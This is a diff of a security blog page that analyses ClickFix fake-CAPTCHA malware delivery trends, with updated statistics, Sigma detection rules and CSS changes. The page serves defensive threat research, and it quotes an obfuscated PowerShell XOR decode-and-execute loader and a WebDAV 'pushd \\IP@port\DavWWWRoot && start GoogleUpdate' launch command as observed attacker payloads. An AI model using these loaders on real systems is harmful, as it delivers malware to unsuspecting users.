@@ -9,7 +9,7 @@ permalink: /trends/clickgrab/
 /* ── Page layout ────────────────────────────────────────────────────────── */
 .cg-page { }
 .cg-page h1 { font-size: 1.6rem; font-weight: 700; color: var(--text); margin-bottom: .25rem; }
-.cg-page h2 { font-size: 1.15rem; font-weight: 600; color: var(--text); margin: 2.5rem 0 .75rem; border-bottom: 1px solid var(--border); padding-bottom: .4rem; }
+.cg-page h2 { font-size: 1.15rem; font-weight: 700; color: var(--text); margin: 2.5rem 0 .75rem; border-bottom: 1px solid transparent; border-image: linear-gradient(to right, var(--accent), var(--border) 35%, transparent) 1; padding-bottom: .4rem; }
 .cg-page h3 { font-size: 1rem; font-weight: 600; color: var(--text); margin: 1.5rem 0 .5rem; }
 .cg-page p, .cg-page li { color: var(--text-muted); font-size: .9rem; line-height: 1.7; }
 .cg-page a { color: var(--link); }
@@ -17,8 +17,8 @@ permalink: /trends/clickgrab/
 
 /* ── Stats row ──────────────────────────────────────────────────────────── */
 .cg-stats { display: flex; gap: 1rem; flex-wrap: wrap; margin: 1.25rem 0 2rem; }
-.cg-stat  { flex: 1 1 140px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: .85rem 1rem; }
-.cg-stat-val { font-size: 1.5rem; font-weight: 700; color: var(--text); font-family: ui-monospace, monospace; line-height: 1.2; }
+.cg-stat  { flex: 1 1 140px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: .85rem 1rem; box-shadow: 0 4px 16px rgba(0,0,0,0.25), inset 0 1px 0 rgba(255,255,255,0.04); }
+.cg-stat-val { font-size: 1.85rem; font-weight: 700; color: var(--text); font-family: ui-monospace, monospace; line-height: 1.2; }
 .cg-stat-lbl { font-size: .72rem; color: var(--text-muted); margin-top: .2rem; text-transform: uppercase; letter-spacing: .04em; }
 
 /* ── Framework chain map ────────────────────────────────────────────────── */
@@ -33,9 +33,9 @@ permalink: /trends/clickgrab/
 .cg-chain-stage:first-child { border-radius: 6px 0 0 6px; }
 .cg-chain-stage:last-child  { border-radius: 0 6px 6px 0; }
 .cg-chain-stage--blind  { border-top: 3px solid var(--border); }
-.cg-chain-stage--t1     { border-top: 3px solid var(--high); }
-.cg-chain-stage--t2     { border-top: 3px solid var(--accent); }
-.cg-chain-stage--t3     { border-top: 3px solid var(--critical); }
+.cg-chain-stage--t1     { border-top: 3px solid var(--high);     box-shadow: inset 0 3px 10px -5px rgba(227,179,65,0.4); }
+.cg-chain-stage--t2     { border-top: 3px solid var(--accent);   box-shadow: inset 0 3px 10px -5px rgba(240,136,62,0.4); }
+.cg-chain-stage--t3     { border-top: 3px solid var(--critical); box-shadow: inset 0 3px 10px -5px rgba(218,54,51,0.4); }
 .cg-chain-label { font-size: .72rem; font-weight: 600; color: var(--text); line-height: 1.3; display: block; }
 .cg-chain-sub   { font-size: .62rem; color: var(--text-muted); margin-top: .25rem; display: block; }
 .cg-tier-badge  { display: inline-block; font-size: .6rem; font-weight: 700; padding: .1rem .35rem; border-radius: 3px; margin-top: .35rem; letter-spacing: .03em; }
@@ -54,19 +54,22 @@ permalink: /trends/clickgrab/
 
 /* ── Callout boxes ──────────────────────────────────────────────────────── */
 .cg-callout { border-radius: 6px; padding: .85rem 1rem; margin: .75rem 0; font-size: .875rem; border-left: 3px solid; }
-.cg-callout--warn  { background: rgba(227,179,65,.08);  border-color: var(--high);     color: var(--text); }
-.cg-callout--alert { background: rgba(218,54,51,.08);   border-color: var(--critical); color: var(--text); }
-.cg-callout--info  { background: rgba(56,139,253,.08);  border-color: var(--low);      color: var(--text); }
-.cg-callout--tip   { background: rgba(63,185,80,.08);   border-color: var(--medium);   color: var(--text); }
+.cg-callout--warn  { background: rgba(227,179,65,.08);  border-color: var(--high);     color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(227,179,65,0.35); }
+.cg-callout--alert { background: rgba(218,54,51,.08);   border-color: var(--critical); color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(218,54,51,0.35); }
+.cg-callout--info  { background: rgba(56,139,253,.08);  border-color: var(--low);      color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(56,139,253,0.35); }
+.cg-callout--tip   { background: rgba(63,185,80,.08);   border-color: var(--medium);   color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(63,185,80,0.35); }
 .cg-callout strong { color: var(--text); }
 
 /* ── Staging domain table ───────────────────────────────────────────────── */
 .cg-table { width: 100%; border-collapse: collapse; font-size: .85rem; margin: .75rem 0 1.5rem; }
 .cg-table th { text-align: left; color: var(--text-muted); font-size: .72rem; text-transform: uppercase; letter-spacing: .04em; border-bottom: 1px solid var(--border); padding: .4rem .6rem; font-weight: 600; }
-.cg-table td { padding: .45rem .6rem; border-bottom: 1px solid var(--border); color: var(--text); font-family: ui-monospace, monospace; font-size: .82rem; }
+.cg-table td { padding: .45rem .6rem; border-bottom: 1px solid var(--border); color: var(--text); font-family: ui-monospace, monospace; font-size: .82rem; transition: background .1s; }
+.cg-table tr:hover td { background: rgba(255,255,255,0.02); }
 .cg-table tr:last-child td { border-bottom: none; }
-.cg-badge-cdn  { display: inline-block; background: rgba(227,179,65,.15); color: var(--high);   font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
-.cg-badge-ip   { display: inline-block; background: rgba(240,136,62,.15); color: var(--accent); font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
+.cg-badge-cdn  { display: inline-block; background: rgba(227,179,65,.15); color: var(--high);     font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
+.cg-badge-ip   { display: inline-block; background: rgba(240,136,62,.15); color: var(--accent);  font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
+.cg-badge-bp   { display: inline-block; background: rgba(218,54,51,.15);  color: var(--critical); font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
+.cg-badge-comp { display: inline-block; background: rgba(139,92,246,.15); color: #8b5cf6;         font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
 
 /* ── Recommendation list ────────────────────────────────────────────────── */
 .cg-rec { display: flex; gap: .75rem; align-items: flex-start; padding: .6rem 0; border-bottom: 1px solid var(--border); }
@@ -109,12 +112,20 @@ permalink: /trends/clickgrab/
   padding: .35rem .75rem;
   text-decoration: none;
   border-left: 2px solid transparent;
-  transition: color .15s, border-color .15s;
+  border-radius: 0 3px 3px 0;
+  transition: color .15s, border-color .15s, background .15s;
 }
-.trends-sidebar a:hover { color: var(--text-muted); text-decoration: none; }
+.trends-sidebar a:hover {
+  color: var(--text-muted);
+  text-decoration: none;
+  background: rgba(255,255,255,0.025);
+}
 .trends-sidebar a.active {
   color: var(--text, #c9d1d9);
-  border-left-color: var(--accent, #f0883e);
+  font-weight: 500;
+  border-left: 3px solid var(--accent, #f0883e);
+  box-shadow: inset 3px 0 8px -4px rgba(240,136,62,0.4);
+  background: rgba(240,136,62,0.07);
 }
 .trends-content {
   flex: 1;
@@ -137,6 +148,38 @@ permalink: /trends/clickgrab/
   .trends-sidebar a.active { border-bottom-color: var(--accent); border-left-color: transparent; }
   .trends-content { padding-bottom: 3.5rem; }
 }
+
+/* ── Detection rec cards (matches edge exploits page) ── */
+.det-rec {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: 6px; margin: 1rem 0; overflow: hidden;
+}
+.det-rec-header {
+  display: flex; align-items: flex-start; gap: 0.8rem;
+  padding: 1rem 1.2rem;
+}
+.det-rec-tier {
+  font-family: var(--font-mono); font-size: 0.65rem;
+  font-weight: 700; letter-spacing: 0.08em;
+  padding: 3px 10px; border-radius: 3px;
+  white-space: nowrap; margin-top: 2px; flex-shrink: 0;
+}
+.det-rec-title { font-weight: 600; color: var(--text); font-size: 0.92rem; line-height: 1.4; }
+.det-rec-desc { color: var(--text-muted); font-size: 0.85rem; margin-top: 0.3rem; line-height: 1.5; }
+.det-rec details { padding: 0 1.2rem; margin: 0; }
+.det-rec details[open] { padding-bottom: 1rem; }
+.det-rec summary {
+  font-family: var(--font-mono); font-size: 0.75rem;
+  color: var(--text-muted); cursor: pointer; margin: 0; padding: 0.5rem 0;
+  list-style: none; display: flex; align-items: center; gap: 0.4rem;
+}
+.det-rec summary::-webkit-details-marker { display: none; }
+.det-rec summary::before { content: "›"; color: var(--text-dim); transition: transform .15s; }
+details[open] > summary::before { transform: rotate(90deg); }
+details[open] > summary { margin-bottom: 0.4rem; }
+.tier-1  { background: rgba(218,54,51,0.15);  color: var(--critical); }
+.tier-2  { background: rgba(240,136,62,0.15);  color: var(--accent); }
+.tier-na { background: rgba(107,114,128,0.15); color: var(--text-muted); }
 </style>
 
 <div class="trends-layout">
@@ -158,7 +201,7 @@ permalink: /trends/clickgrab/
 <h1>ClickFix Delivery Chain: Trend Analysis</h1>
 <p class="cg-meta">
   Data: <a href="https://github.com/mhaggis/ClickGrab" target="_blank" rel="noopener">MHaggis ClickGrab</a> + <a href="https://clickfix.carsonww.com/" target="_blank" rel="noopener">ClickFix Hunter</a>
-  &nbsp;·&nbsp; Period: Apr 2025 – Apr 2026
+  &nbsp;·&nbsp; Period: Apr 2025 – May 2026
   &nbsp;·&nbsp; {{ site.data.clickgrab_trends.meta.total_reports }} nightly reports + {{ site.data.clickgrab_trends.meta.total_domains }} domains
   &nbsp;·&nbsp; Generated: {{ site.data.clickgrab_trends.meta.generated }}
 </p>
@@ -244,6 +287,10 @@ permalink: /trends/clickgrab/
   <div id="cg-chart-volume"></div>
 </div>
 
+<div class="cg-callout cg-callout--alert">
+  <strong>May 2026: 95.2% of domains now carry inline payloads.</strong> Up from 75% in April and 47% in March, the no-URL rate has hit a new high. Base64 accounts for 87% of May domains (399/458). A new delivery variant also appeared: <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> mounts a WebDAV share and launches a binary impersonating Google Update — no PowerShell, no HTTP fetch, no URL in the clipboard command at all. Your T1105 network-fetch detection never fires. The behavioral chokepoint that does fire: unusual parent process spawning <code>conhost.exe</code> or <code>cmd.exe</code> with a UNC path argument.
+</div>
+
 <!-- ── Chart B: Cradle Family Evolution ──────────────────────────────── -->
 <h2 id="cradles">T1105 Ingress Tool Transfer: Cradle Family Evolution</h2>
 <p>The network fetch <em>was</em> the unavoidable action. This chart shows how adversaries rotated their download method as defenders tuned IWR/IEX-specific detections, and why that rotation actually validates the chokepoint approach.</p>
@@ -279,7 +326,7 @@ permalink: /trends/clickgrab/
 </div>
 
 <div class="cg-callout cg-callout--warn">
-  <strong>Base64 isn't plateauing. It's accelerating.</strong> 19.5% in March, 54.2% in April. If your rules match plaintext <code>iwr https://</code> strings, you're seeing the encoded version now, not the decoded cradle. Detect the encoding act: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Or detect <code>-enc</code> on the command line from an unusual parent. The content is opaque; the execution context isn't.
+  <strong>Base64 isn't plateauing. It's now the default.</strong> 19.5% in March, 54.2% in April, <strong>87% in May</strong> (399/458 domains). If your rules match plaintext <code>iwr https://</code> strings, you're seeing the encoded version now, not the decoded cradle. Detect the encoding act: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Or detect <code>-enc</code> on the command line from an unusual parent. The content is opaque; the execution context isn't.
 </div>
 
 <div class="cg-callout cg-callout--warn">
@@ -303,19 +350,19 @@ permalink: /trends/clickgrab/
 
 <!-- ── Inline Payloads ─────────────────────────────────────────── -->
 <h2 id="inline">Strategic Shift: Inline Payloads Bypassing Network Fetch Detection</h2>
-<p>Here's the finding that changes the detection calculus: <strong>75% of April 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline. The user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
+<p>Here's the finding that changes the detection calculus: <strong>95% of May 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline. The user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
 
-<p>Three techniques are driving this: <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 62 instances in March), <strong>Base64 <code>-enc</code></strong> (over half of April samples), and <strong>direct embedding</strong> with no obfuscation at all. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>
+<p>Base64 now accounts for 87% of May domains (399/458) — it's not one technique among several, it's the default. Two other techniques appear in smaller numbers: <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 62 instances in March), and a newer <strong>WebDAV delivery</strong> variant using <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> — no PowerShell, no HTTP, nothing to intercept at the network layer. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>
 
 <pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>powershell -w hidden &lt;# I am not a robot - Cloudflare ID: 8e3f2a #&gt; $k='xK9mP2';$d='4a5b6c...';
 $b=[byte[]]@();for($i=0;$i-lt$d.Length;$i+=2){$b+=[byte]("0x"+$d.Substring($i,2))-bxor[byte]$k[$i%$k.Length]};
 iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
 
 <div class="cg-callout cg-callout--alert">
-  <strong>Your network-fetch detection covers half the threat now.</strong> 46% of March and 75% of April domains skip the remote fetch entirely. You need a parallel detection for the decode-and-execute pattern: unusual parent → PowerShell with <code>-enc</code>, <code>-bxor</code> operations, or <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Neither detection alone is sufficient anymore. Run both.
+  <strong>Your network-fetch detection covers 5% of the threat now.</strong> 95% of May 2026 domains skip the remote fetch entirely. You need a parallel detection for the decode-and-execute pattern: unusual parent → PowerShell with <code>-enc</code>, <code>-bxor</code> operations, or <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Neither detection alone is sufficient anymore. Run both. And if you're not alerting on <code>conhost --headless</code> spawning <code>cmd.exe</code> with a UNC path argument, you have a blind spot for the WebDAV variant entirely.
 </div>
 
-<p>Monthly no-URL trend: Aug 28% → Sep 32% → Oct 32% → Nov 6% → Dec 19% → Jan 44% → Feb 30% → <strong>Mar 47% → Apr 75%</strong>.</p>
+<p>Monthly no-URL trend: Aug 28% → Sep 32% → Oct 32% → Nov 6% → Dec 19% → Jan 44% → Feb 30% → Mar 47% → Apr 75% → <strong>May 95%</strong>.</p>
 
 <h3>Port 5506 C2 Infrastructure Cluster</h3>
 <p>333 domains call back to port 5506 across 14 IPs in a few /24 ranges. One operator, one port, zero legitimate services using 5506. This is the kind of infrastructure fingerprint that makes network detection easy.</p>
@@ -354,11 +401,16 @@ iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
       <td>
         {% if d.cdn %}<span class="cg-badge-cdn">CDN</span>
         {% elsif d.is_ip %}<span class="cg-badge-ip">IP</span>
+        {% elsif d.hosting_type == "bulletproof" %}<span class="cg-badge-bp">BP</span>
+        {% elsif d.hosting_type == "compromised" %}<span class="cg-badge-comp">COMP</span>
+        {% elsif d.hosting_type == "managed" %}<span class="cg-badge-cdn">MGD</span>
         {% else %}-{% endif %}
       </td>
       <td style="color:var(--text-muted);font-family:inherit;font-size:.8rem;">
         {% if d.cdn %}Domain reputation blocklists ineffective (legitimate CDN provider)
-        {% elsif d.domain contains "wpengine.com" %}Managed WP hosting. Likely compromised; blocklist removes legitimate sites
+        {% elsif d.hosting_type == "bulletproof" %}Abuse-tolerant VPS — takedown requests ignored; block by ASN or IP range
+        {% elsif d.hosting_type == "compromised" %}Legitimate site used as payload host — blocking harms the victim domain
+        {% elsif d.domain contains "wpengine.com" %}Managed WP hosting — blocklist removes legitimate sites
         {% elsif d.domain contains "blogspot.com" or d.domain contains "blogger.com" %}Google-hosted; domain blocking would block all of Blogger
         {% else %}-{% endif %}
       </td>
@@ -432,18 +484,25 @@ iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
 <h2 id="recommendations">Detection Recommendations</h2>
 <p>Each recommendation maps to the ATT&CK technique it detects. The ones at the top survived every cradle rotation, every obfuscation pivot, and every infrastructure change in this dataset. The ones lower down are still valuable but more brittle.</p>
 
-<div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1059</span></div>
-  <div class="cg-rec-body">
-    <strong>Detect unusual parent → PowerShell spawn</strong>
-    Correlate <code>explorer.exe</code> or <code>cmd.exe</code> (from Run dialog) spawning <code>powershell.exe</code> with a window-hidden flag. This signal is constant regardless of cradle family rotation. See <a href="https://github.com/{{ site.github_username }}/{{ site.github_repo }}/blob/main/sigma-rules/clickfix/hunt.yml" target="_blank" rel="noopener">sigma-rules/clickfix/hunt.yml</a>.
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="logic-ex-hidden">
-        <span class="collapsible-chevron">›</span>
-        Example detection logic
-      </button>
-      <div id="logic-ex-hidden" class="collapsible-body collapsed">
+<div class="det-rec">
+  <div class="det-rec-header">
+    <span class="det-rec-tier tier-1">T1059</span>
+    <div>
+      <div class="det-rec-title">Detect unusual parent → PowerShell spawn</div>
+      <div class="det-rec-desc">Correlate <code>explorer.exe</code> or <code>cmd.exe</code> (from Run dialog) spawning <code>powershell.exe</code> with a window-hidden flag. This signal is constant regardless of cradle family rotation. See <a href="https://github.com/{{ site.github_username }}/{{ site.github_repo }}/blob/main/sigma-rules/clickfix/hunt.yml" target="_blank" rel="noopener">sigma-rules/clickfix/hunt.yml</a>.</div>
+    </div>
+  </div>
+  {% if site.data.clickgrab_trends.payload_examples.hidden_window.size > 0 %}
+  <details>
+    <summary>Observed payloads ({{ site.data.clickgrab_trends.payload_examples.hidden_window | size }})</summary>
+    {% for ex in site.data.clickgrab_trends.payload_examples.hidden_window %}
+    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
+    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
+    {% endfor %}
+  </details>
+  {% endif %}
+  <details>
+    <summary>Example detection logic</summary>
 <pre class="cg-payload-example"><code>title: Browser or Explorer Spawning Hidden PowerShell
 logsource:
   category: process_creation
@@ -469,38 +528,53 @@ detection:
       - '-NoProfile'
   condition: selection_interp and selection_parent and selection_hidden
 level: high</code></pre>
-      </div>
-    </div>
-    {% if site.data.clickgrab_trends.payload_examples.hidden_window.size > 0 %}
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="payload-ex-hidden">
-        <span class="collapsible-chevron">›</span>
-        Example payloads ({{ site.data.clickgrab_trends.payload_examples.hidden_window | size }})
-      </button>
-      <div id="payload-ex-hidden" class="collapsible-body collapsed">
-        {% for ex in site.data.clickgrab_trends.payload_examples.hidden_window %}
-        <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
-        <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
-        {% endfor %}
-      </div>
-    </div>
-    {% endif %}
-  </div>
+  </details>
 </div>
 
-<div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1059</span></div>
-  <div class="cg-rec-body">
-    <strong>Cradle-agnostic network fetch detection</strong>
-    Move from IWR/IRM string matching to: <em>PowerShell process → outbound HTTP/HTTPS to non-Microsoft, non-CDN domain → path ends in .ps1/.txt/.hta</em>. This catches IWR, Curl, WebClient, and any future cradle. Update Sigma rules to use process+network correlation, not command-string pattern matching.
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="logic-ex-cradles">
-        <span class="collapsible-chevron">›</span>
-        Example detection logic
-      </button>
-      <div id="logic-ex-cradles" class="collapsible-body collapsed">
+<div class="det-rec">
+  <div class="det-rec-header">
+    <span class="det-rec-tier tier-1">T1059</span>
+    <div>
+      <div class="det-rec-title">Cradle-agnostic network fetch detection</div>
+      <div class="det-rec-desc">Move from IWR/IRM string matching to: <em>PowerShell process → outbound HTTP/HTTPS to non-Microsoft, non-CDN domain → path ends in .ps1/.txt/.hta</em>. This catches IWR, Curl, WebClient, and any future cradle. Update Sigma rules to use process+network correlation, not command-string pattern matching.</div>
+    </div>
+  </div>
+  {% assign all_cradle_examples = site.data.clickgrab_trends.payload_examples.iwr_iex | concat: site.data.clickgrab_trends.payload_examples.irm_iex | concat: site.data.clickgrab_trends.payload_examples.webclient | concat: site.data.clickgrab_trends.payload_examples.curl %}
+  {% if all_cradle_examples.size > 0 %}
+  <details>
+    <summary>Observed payloads ({{ all_cradle_examples | size }})</summary>
+    {% if site.data.clickgrab_trends.payload_examples.iwr_iex.size > 0 %}
+    <div class="cg-payload-label">IWR / IEX</div>
+    {% for ex in site.data.clickgrab_trends.payload_examples.iwr_iex %}
+    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
+    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
+    {% endfor %}
+    {% endif %}
+    {% if site.data.clickgrab_trends.payload_examples.irm_iex.size > 0 %}
+    <div class="cg-payload-label">IRM / IEX</div>
+    {% for ex in site.data.clickgrab_trends.payload_examples.irm_iex %}
+    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
+    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
+    {% endfor %}
+    {% endif %}
+    {% if site.data.clickgrab_trends.payload_examples.webclient.size > 0 %}
+    <div class="cg-payload-label">WebClient</div>
+    {% for ex in site.data.clickgrab_trends.payload_examples.webclient %}
+    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
+    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
+    {% endfor %}
+    {% endif %}
+    {% if site.data.clickgrab_trends.payload_examples.curl.size > 0 %}
+    <div class="cg-payload-label">Curl</div>
+    {% for ex in site.data.clickgrab_trends.payload_examples.curl %}
+    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
+    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
+    {% endfor %}
+    {% endif %}
+  </details>
+  {% endif %}
+  <details>
+    <summary>Example detection logic</summary>
 <pre class="cg-payload-example"><code>title: PowerShell Outbound Fetch of Script Payload
 logsource:
   category: network_connection
@@ -528,63 +602,31 @@ detection:
   condition: selection_proc and selection_outbound and not (filter_internal or filter_ms)
 level: high
 # Pair with file_event rule matching *.ps1/*.txt/*.hta writes by the same ProcessGuid.</code></pre>
-      </div>
-    </div>
-    {% assign all_cradle_examples = site.data.clickgrab_trends.payload_examples.iwr_iex | concat: site.data.clickgrab_trends.payload_examples.irm_iex | concat: site.data.clickgrab_trends.payload_examples.webclient | concat: site.data.clickgrab_trends.payload_examples.curl %}
-    {% if all_cradle_examples.size > 0 %}
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="payload-ex-cradles">
-        <span class="collapsible-chevron">›</span>
-        Example payloads ({{ all_cradle_examples | size }})
-      </button>
-      <div id="payload-ex-cradles" class="collapsible-body collapsed">
-        {% if site.data.clickgrab_trends.payload_examples.iwr_iex.size > 0 %}
-        <div class="cg-payload-label">IWR / IEX</div>
-        {% for ex in site.data.clickgrab_trends.payload_examples.iwr_iex %}
-        <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
-        <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
-        {% endfor %}
-        {% endif %}
-        {% if site.data.clickgrab_trends.payload_examples.irm_iex.size > 0 %}
-        <div class="cg-payload-label">IRM / IEX</div>
-        {% for ex in site.data.clickgrab_trends.payload_examples.irm_iex %}
-        <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
-        <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
-        {% endfor %}
-        {% endif %}
-        {% if site.data.clickgrab_trends.payload_examples.webclient.size > 0 %}
-        <div class="cg-payload-label">WebClient</div>
-        {% for ex in site.data.clickgrab_trends.payload_examples.webclient %}
-        <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
-        <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
-        {% endfor %}
-        {% endif %}
-        {% if site.data.clickgrab_trends.payload_examples.curl.size > 0 %}
-        <div class="cg-payload-label">Curl</div>
-        {% for ex in site.data.clickgrab_trends.payload_examples.curl %}
-        <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
-        <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
-        {% endfor %}
-        {% endif %}
-      </div>
-    </div>
-    {% endif %}
-  </div>
+  </details>
 </div>
 
-<div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t2" style="display:block;text-align:center;padding:.25rem .5rem;">T1027</span></div>
-  <div class="cg-rec-body">
-    <strong>Detect Base64 decode + execute</strong>
-    <code>[Convert]::FromBase64String</code> or <code>[Text.Encoding]::UTF8.GetString</code> followed immediately by <code>iex</code> / <code>Invoke-Expression</code>. The encoding act itself is detectable even when the decoded content is not. This covers the 18× Base64 increase seen in Jan 2026.
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="logic-ex-b64">
-        <span class="collapsible-chevron">›</span>
-        Example detection logic
-      </button>
-      <div id="logic-ex-b64" class="collapsible-body collapsed">
+<div class="det-rec">
+  <div class="det-rec-header">
+    <span class="det-rec-tier tier-2">T1027</span>
+    <div>
+      <div class="det-rec-title">Detect Base64 decode + execute</div>
+      <div class="det-rec-desc"><code>[Convert]::FromBase64String</code> or <code>[Text.Encoding]::UTF8.GetString</code> followed immediately by <code>iex</code> / <code>Invoke-Expression</code>. The encoding act itself is detectable even when the decoded content is not. This covers the 18× Base64 increase seen in Jan 2026.</div>
+    </div>
+  </div>
+  {% if site.data.clickgrab_trends.payload_examples.base64.size > 0 %}
+  <details>
+    <summary>Observed payloads ({{ site.data.clickgrab_trends.payload_examples.base64 | size }})</summary>
+    {% for ex in site.data.clickgrab_trends.payload_examples.base64 %}
+    <div class="cg-payload-label">Encoded command</div>
+    <pre class="cg-payload-example"><code>{{ ex.encoded }}</code></pre>
+    <div class="cg-payload-label">Decoded</div>
+    <pre class="cg-payload-example"><code>{{ ex.decoded }}</code></pre>
+    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
+    {% endfor %}
+  </details>
+  {% endif %}
+  <details>
+    <summary>Example detection logic</summary>
 <pre class="cg-payload-example"><code>title: PowerShell Base64 Decode Piped to Invoke-Expression
 logsource:
   category: process_creation
@@ -605,41 +647,28 @@ detection:
       - '-e '
   condition: selection_proc and (selection_decode_exec or selection_enc)
 level: high</code></pre>
-      </div>
-    </div>
-    {% if site.data.clickgrab_trends.payload_examples.base64.size > 0 %}
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="payload-ex-b64">
-        <span class="collapsible-chevron">›</span>
-        Example payloads ({{ site.data.clickgrab_trends.payload_examples.base64 | size }})
-      </button>
-      <div id="payload-ex-b64" class="collapsible-body collapsed">
-        {% for ex in site.data.clickgrab_trends.payload_examples.base64 %}
-        <div class="cg-payload-label">Encoded command</div>
-        <pre class="cg-payload-example"><code>{{ ex.encoded }}</code></pre>
-        <div class="cg-payload-label">Decoded</div>
-        <pre class="cg-payload-example"><code>{{ ex.decoded }}</code></pre>
-        <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
-        {% endfor %}
-      </div>
-    </div>
-    {% endif %}
-  </div>
+  </details>
 </div>
 
-<div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t2" style="display:block;text-align:center;padding:.25rem .5rem;">T1070</span></div>
-  <div class="cg-rec-body">
-    <strong>File write → execute → delete correlation (new Dec 2025)</strong>
-    Self-delete appeared at scale in December 2025. Correlate: script written to <code>%TEMP%</code> → process execution from that path → file deletion within seconds. If artifact-based rules are your only coverage, they're now blind after execution completes. Use process execution telemetry, not file presence.
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="logic-ex-selfdelete">
-        <span class="collapsible-chevron">›</span>
-        Example detection logic
-      </button>
-      <div id="logic-ex-selfdelete" class="collapsible-body collapsed">
+<div class="det-rec">
+  <div class="det-rec-header">
+    <span class="det-rec-tier tier-2">T1070</span>
+    <div>
+      <div class="det-rec-title">File write → execute → delete correlation (new Dec 2025)</div>
+      <div class="det-rec-desc">Self-delete appeared at scale in December 2025. Correlate: script written to <code>%TEMP%</code> → process execution from that path → file deletion within seconds. If artifact-based rules are your only coverage, they're now blind after execution completes. Use process execution telemetry, not file presence.</div>
+    </div>
+  </div>
+  {% if site.data.clickgrab_trends.payload_examples.self_delete.size > 0 %}
+  <details>
+    <summary>Observed payloads ({{ site.data.clickgrab_trends.payload_examples.self_delete | size }})</summary>
+    {% for ex in site.data.clickgrab_trends.payload_examples.self_delete %}
+    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
+    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
+    {% endfor %}
+  </details>
+  {% endif %}
+  <details>
+    <summary>Example detection logic</summary>
 <pre class="cg-payload-example"><code>title: Script Self-Delete After Execution From TEMP
 # Correlation: file_event (write) + process_creation + file_event (delete) on same ProcessGuid/TargetFilename within 10s.
 logsource:
@@ -663,38 +692,28 @@ detection:
     TargetFilename: '%file_write.TargetFilename%'
   condition: file_write | followed_by process_exec | followed_by file_delete within 10s
 level: high</code></pre>
-      </div>
-    </div>
-    {% if site.data.clickgrab_trends.payload_examples.self_delete.size > 0 %}
